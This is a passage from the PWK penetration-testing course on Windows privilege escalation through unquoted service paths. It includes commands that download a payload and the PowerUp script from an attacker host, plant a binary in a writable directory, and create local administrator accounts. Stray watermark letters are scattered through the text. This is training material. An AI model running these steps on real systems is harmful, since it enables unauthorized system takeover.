When a service is started and a process is created, the Windows CreateProcess806 function is
used. Reviewing the first parameter of the function, lpApplicationName is used to specify the
805 (Andrew Freeborn, 2016), https://www.tenable.com/sc-report-templates/microsoft-windows-unquoted-service-path-vulnerability
806 (Microsoft Documentation, 2022), https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-
processthreadsapi-createprocessa
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 514
Made in Morocco
Penetration Testing with Kali Linux
name and optionally the path to the executable file. If the provided string contains spaces and is
not enclosed within quotation marks, it can be interpreted in various ways because it is unclear to
the function where the file name ends and the arguments begin. To determine this, the function
starts interpreting the path from left to right until a space is reached. For every space in the file
path, the function uses the preceding part as file name by adding .exe and the rest as arguments.
Let’s show this in an example with the unquoted service binary path C:\Program Files\My
Program\My Service\service.exe. When Windows starts the service, it will use the following order
to try to start the executable file due to the spaces in the path.
C:\Program.exe
C:\Program Files\My.exe
C:\Program Files\My Program\My.exe
C:\Program Files\My Program\My service\service.exe
Listing 437 - Example of how Windows will try to locate the correct path of an unquoted service
y
Listing 437 shows the order Windows tries to interpret the service binary path to locate the
executable file. k
In order to exploit this and subvert the original unquoted service call, we must create a malicious
s
executable, place it in a directory that corresponds to one of the interpreted paths, and match its
name to the interpreted filename. Then, once the service is started, our file gets executed with the
same privileges that the service starts with. Ofteno, this happens to be the LocalSystem account,
which results in a successful privilege escalation attack.
In the context of the example, we could nname our executable Program.exe and place it in C:\,
My.exe and place it in C:\Program Files\, or My.exe and place it in C:\Program Files\My Program\.
However, the first two options would require some unlikely permissions since standard users
i
don’t have the permissions to write to these directories by default. The third option is more likely
z
as it is the software’s main directory. If an administrative user or developer set the permissions
for this directory too open, we can place our malicious binary there.
D
Now that we have a basic understanding of this vulnerability, let’s use it in an example. We
connect to CLIENTWK220 as steve (password securityIsNotAnOption++++++) with RDP. We open
PowerShell and enumerate running and stopped services.
PS C:\Users\steve> Get-CimInstance -ClassName win32_service | Select
Name,State,PathName
Name State PathName
---- ----- --------
...
GammaService Stopped C:\Program Files\Enterprise
Apps\Current Version\GammaServ.exe
...
Listing 438 - List of services with binary path
Listing 438 shows a stopped service named GammaService. The unquoted service binary path
contains multiple spaces and is therefore potentially vulnerable to this attack vector.
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 515
Made in Morocco
Penetration Testing with Kali Linux
A more effective way to identify spaces in the paths and missing quotes is using the WMI
command-line (WMIC)807 utility. We can enter service to obtain service information and the verb
get with name and pathname as arguments to retrieve only these specific property values. We’ll
pipe the output of this command to findstr with /i for case-insensitive searching and /v to only
print lines that don’t match. As the argument for this command, we’ll enter “C:\Windows\” to
show only services with a binary path outside of the Windows directory. We’ll pipe the output of
this command to another findstr command, which uses """ as argument to print only matches
without quotes.
Let’s enter this command in cmd.exe instead of PowerShell to avoid escaping issues for the
quote in the second findstr command.808 Alternatively, we could use Select-String809 in PowerShell.
C:\Users\steve> wmic service get name,pathname | findstr /i /v "C:\Windows\\" |
findstr /i /v """
Name PathName y
...
GammaService C:\Program Files\Enterprise Apps\Current
Version\GammaServ.exe k
Listing 439 - List of services with spaces and missing quotes in the binary path
s
The output of this command only lists services that are potentially vulnerable to our attack vector,
such as GammaService.
o
Before we go on, let’s check if we can start and stop the identified service as steve with Start-
Service and Stop-Service.
n
PS C:\Users\steve> Start-Service GammaService
WARNING: Waiting for service 'GammaService (GammaService)' to start...
i
PS C:\Users\steve> Stop-Servicze GammaService
Listing 440 - Using Start-Service and Stop-Service to check if user steve has permissions to start and stop GammaService
D
The output from Listing 440 indicates that steve has permissions to start and stop
GammaService.
Since we can restart the service ourselves, we don’t need to issue a reboot to restart the service.
Next, let’s list the paths Windows uses to attempt locating the executable file of the service.
C:\Program.exe
C:\Program Files\Enterprise.exe
C:\Program Files\Enterprise Apps\Current.exe
C:\Program Files\Enterprise Apps\Current Version\GammaServ.exe
Listing 441 - How Windows tries to locate the correct path of the unquoted service GammaService
Let’s check our access rights in these paths with icacls. We’ll begin with the first two paths from
Listing 441.
PS C:\Users\steve> icacls "C:\"
C:\ BUILTIN\Administrators:(OI)(CI)(F)
807 (Microsoft Documentation, 2022), https://docs.microsoft.com/en-us/windows/win32/wmisdk/wmic
808 (Richard L. Mueller, 2021), https://www.rlmueller.net/PowerShellEscape.htm
809 (Microsoft Documentation, 2022), https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/select-
string?view=powershell-7.2
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 516
Made in Morocco
Penetration Testing with Kali Linux
NT AUTHORITY\SYSTEM:(OI)(CI)(F)
BUILTIN\Users:(OI)(CI)(RX)
NT AUTHORITY\Authenticated Users:(OI)(CI)(IO)(M)
NT AUTHORITY\Authenticated Users:(AD)
Mandatory Label\High Mandatory Level:(OI)(NP)(IO)(NW)
Successfully processed 1 files; Failed processing 0 files
PS C:\Users\steve>icacls "C:\Program Files"
C:\Program Files NT SERVICE\TrustedInstaller:(F)
NT SERVICE\TrustedInstaller:(CI)(IO)(F)
NT AUTHORITY\SYSTEM:(M)
NT AUTHORITY\SYSTEM:(OI)(CI)(IO)(F)
BUILTIN\Administrators:(M)
BUILTIN\Administrators:(OI)(CI)(IO)(F)
BUILTIN\Users:(RX) y
BUILTIN\Users:(OI)(CI)(IO)(GR,GE)
CREATOR OWNER:(OI)(CI)(IO)(F)
... k
Successfully processed 1 files; Failed processing 0 files
s
Listing 442 - Reviewing permissions on the paths C:\ and C:\Program Files\
As expected, our user steve, as a omember of BUILTIN\Users and NT
AUTHORITY\AUTHENTICATED Users, has no Write permissions in either of these paths. Now, let’s
check the path of the third option. We can skip the fourth path since it represents the service
n
binary itself.
PS C:\Users\steve> icacls "C:\Program Files\Enterprise Apps"
i
C:\Program Files\Enterprise Apps NT SERVICE\TrustedInstaller:(CI)(F)
z
NT AUTHORITY\SYSTEM:(OI)(CI)(F)
BUILTIN\Administrators:(OI)(CI)(F)
BUILTIN\Users:(OI)(CI)(RX,W)
D
CREATOR OWNER:(OI)(CI)(IO)(F)
APPLICATION PACKAGE AUTHORITY\ALL APPLICATION
PACKAGES:(OI)(CI)(RX)
APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED
APPLICATION PACKAGES:(OI)(CI)(RX)
Successfully processed 1 files; Failed processing 0 files
Listing 443 - Reviewing permissions on the Enterprise Apps directory
Listing 443 shows that BUILTIN\Users has Write (w) permissions on the path C:\Program
Files\Enterprise Apps. Our goal is now to place a malicious file named Current.exe in C:\Program
Files\Enterprise Apps\.
We can reuse the adduser.exe binary by compiling the C code from the section “Service Binary
Hijacking”. On Kali, we start a Python3 web server in the directory of the executable file in order to
serve it.
Once the web server is running, we can download adduser.exe on the target machine as steve. To
save the file with the correct name for our privilege escalation attack, we enter Current.exe as
argument for -Outfile. After the file is downloaded, we copy it to C:\Program Files\Enterprise
Apps\.
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 517
Made in Morocco
Penetration Testing with Kali Linux
PS C:\Users\steve> iwr -uri http://192.168.119.3/adduser.exe -Outfile Current.exe
PS C:\Users\steve> copy .\Current.exe 'C:\Program Files\Enterprise Apps\Current.exe'
Listing 444 - Download adduser.exe, save it as Current.exe, and copy it to Enterprise Apps directory
Now, everything is ready for us to start the service, which should execute Current.exe instead of
the original service binary GammaServ.exe. For this, we use Start-Service with GammaService as
argument. We can use net user to check if dave2 was created and net localgroup administrators
to confirm that dave2 was added to the local Administrators group.
PS C:\Users\steve> Start-Service GammaService
Start-Service : Service 'GammaService (GammaService)' cannot be started due to the
following error: Cannot start
service GammaService on computer '.'.
At line:1 char:1
+ Start-Service GammaService y
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~
+ CategoryInfo : OpenError:
k
(System.ServiceProcess.ServiceController:ServiceController) [Start-Service],
ServiceCommandException
+ FullyQualifiedErrorId : s
CouldNotStartService,Microsoft.PowerShell.Commands.StartServiceCommand
o
PS C:\Users\steve> net user
Administrator BackupAdmin dave
n
dave2 daveadmin DefaultAccount
Guest offsec steve
WDAGUtilityAccount
i
The command completed successfully.
z
PS C:\Users\steve> net localgroup administrators
... D
Members
-------------------------------------------------------------------------------
Administrator
BackupAdmin
dave2
daveadmin
offsec
The command completed successfully.
Listing 445 - Start service GammaService and confirm that dave2 was created as member of local Administrators group
Listing 445 shows that the Start-Service command displayed an error that Windows cannot start
the service. The error stems from the fact that our cross-compiled C code does not accept the
parameters that are a leftover of the original service binary path. However, Current.exe was still
executed and dave2 was created as a member of the local Administrators group. Great!
To restore the functionality of the original service, we have to stop the service and delete our
binary Current.exe. After the executable file is removed, Windows will use the service binary
GammaServ.exe again once the service is started.
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 518
Made in Morocco
Penetration Testing with Kali Linux
Before we conclude this section, let’s check if PowerUp identifies this vulnerability. For this, we
download PowerUp with iwr and import it into a PowerShell session as we did previously. Then
we set the ExecutionPolicy to Bypass and use Get-UnquotedService.
PS C:\Users\dave> iwr http://192.168.119.3/PowerUp.ps1 -Outfile PowerUp.ps1
PS C:\Users\dave> powershell -ep bypass
...
PS C:\Users\dave> . .\PowerUp.ps1
PS C:\Users\dave> Get-UnquotedService
ServiceName : GammaService
Path : C:\Program Files\Enterprise Apps\Current Version\GammaServ.exe
ModifiablePath : @{ModifiablePath=C:\; IdentityReference=NT AyUTHORITY\Authenticated
Users;
Permissions=AppendData/AddSubdirectory}
k
StartName : LocalSystem
AbuseFunction : Write-ServiceBinary -Name 'GammaService' -Path 
CanRestart : True s
ServiceName : GammaService
Path : C:\Program Files\Enterprise oApps\Current Version\GammaServ.exe
ModifiablePath : @{ModifiablePath=C:\; IdentityReference=NT AUTHORITY\Authenticated
Users; Permissions=System.Object[]}
n
StartName : LocalSystem
AbuseFunction : Write-ServiceBinary -Name 'GammaService' -Path 
CanRestart : True
i
Listing 446 - Using Get-UnquotedService to list potential vulnerable services
z
Listing 446 shows that the GammaService was identified as vulnerable. Let’s use the
AbuseFunction and restart the service to attempt to elevate our privileges. For -Path, we enter the
D
same path for Current.exe as we did in Listing 444. As stated before, the default behavior is to
create a new local user called john with the password Password123!. Additionally, the user is
added to the local Administrators group.
PS C:\Users\steve> Write-ServiceBinary -Name 'GammaService' -Path "C:\Program
Files\Enterprise Apps\Current.exe"
ServiceName Path Command
----------- ---- -------
GammaService C:\Program Files\Enterprise Apps\Current.exe net user john Password123!
/add && timeout /t 5 && net loc...
PS C:\Users\steve> Restart-Service GammaService
WARNING: Waiting for service 'GammaService (GammaService)' to start...
Restart-Service : Failed to start service 'GammaService (GammaService)'.
At line:1 char:1
+ Restart-Service GammaService
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+ CategoryInfo : OpenError:
(System.ServiceProcess.ServiceController:ServiceController) [Restart-Service]
, ServiceCommandException
+ FullyQualifiedErrorId :
StartServiceFailed,Microsoft.PowerShell.Commands.RestartServiceCommand
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 519
Made in Morocco
Penetration Testing with Kali Linux
PS C:\Users\steve> net user
User accounts for \\CLIENTWK220
-------------------------------------------------------------------------------
Administrator BackupAdmin dave
dave2 daveadmin DefaultAccount
Guest john offsec
steve WDAGUtilityAccount
The command completed successfully.
PS C:\Users\steve> net localgroup administrators
...
john y
...
Listing 447 - Using the AbuseFunction to exploit the unquoted service path of GammaService
k
The output of the commands in Listing 447 shows that by using the AbuseFunction, Write-
ServiceBinary, the user john was created as a local administrator. Very nice!
s
In this section, we covered yet another privilege escalation vector related to Windows services.
We learned how to identify services missing quotoes and containing spaces in the service binary
path. Furthermore, we learned how Windows tries to determine the correct executable file path in
this situation. By finding a writable directory suitable for this vulnerability, we could place a
n
malicious executable file in the path, which is executed by starting the service. Finally, we
automated the exploitation of this vector by using PowerUp’s Get-UnquotedService and Write-
ServiceBinary functions. i
z
Although this vulnerability requires a specific combination of requirements, it is easily exploitable
and a privilege escalation attack vector worth considering.
D
16.3 Abusing Other Windows Components
This Learning Unit covers the following Learning Objectives:
• Leverage Scheduled Tasks to elevate our privileges
• Understand the different types of exploits leading to privilege escalation
• Abuse privileges to execute code as privileged user accounts
In the previous Learning Unit, we used privilege escalation vectors related to Windows services.
This is not the only Windows component we can abuse to elevate our privileges. In this Learning